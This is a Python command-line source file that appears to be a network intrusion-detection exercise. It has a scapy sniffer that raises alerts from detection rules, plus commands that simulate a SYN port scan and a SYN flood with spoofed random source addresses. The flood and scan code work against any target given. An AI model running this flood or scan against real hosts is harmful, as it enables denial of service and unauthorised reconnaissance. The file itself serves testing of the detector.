import click
from scapy.all import IP, TCP
from application.detection_rules import *
import random
@click.group()
def cli():
    pass

def detect(packet):
    result, message = http_get(packet)
    if result:
        print(f"{datetime.now()} - \033[31mALERT:\033[0m {message}")
        
    result, message = dns_query(packet)
    if result:
        print(f"{datetime.now()} - \033[31mALERT:\033[0m {message}")
        
    result, message = ssh_connection(packet)
    if result:
        print(f"{datetime.now()} - \033[31mALERT:\033[0m {message}")
        
    result, message = icmp_ping(packet)
    if result:
        print(f"{datetime.now()} - \033[31mALERT:\033[0m {message}")
        
    result, message = rate_limiting(packet)
    if result:
        print(f"{datetime.now()} - \033[31mALERT:\033[0m {message}")
        
    result, message = syn_flood(packet)
    if result:
        print(f"{datetime.now()} - \033[31mALERT:\033[0m {message}")
        
        
@click.command()   
@click.argument("interface")  
def sniffer(interface):
    print(f"{datetime.now()} - Starting packet sniffer...")
    sniff(iface=interface, prn=lambda packet: detect(packet), store=0)
            

@click.command()
@click.argument("target_ip")
@click.argument("ports", nargs=-1, type=int)
def simulate_port_scan(target_ip, ports):
    for port in ports:
        packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
        response = sr1(packet, timeout=1, verbose=0)
        
        if response and response.haslayer(TCP):
            if response["TCP"].flags == "SA":
                print(f"Port {port}: Open")
            elif response["TCP"].flags == "RA":
                print(f"Port {port}: Closed")
        else:
            print(f"Port {port}: No response")
            
@click.command()
@click.argument("target_ip")
@click.argument("target_port", type=int)
@click.argument("packet_count", type=int)
def simulate_syn_flood(target_ip, target_port, packet_count):
    print(f"Launching SYN flood attack on {target_ip}:{target_port} with {packet_count} packets.")
    
    for _ in range(packet_count):
        src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
        src_port = random.randint(1024, 65535)
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)

    print("Attack completed.")
   


cli.add_command(sniffer)
cli.add_command(simulate_port_scan)
cli.add_command(simulate_syn_flood)

if __name__ == "__main__":
    cli()
    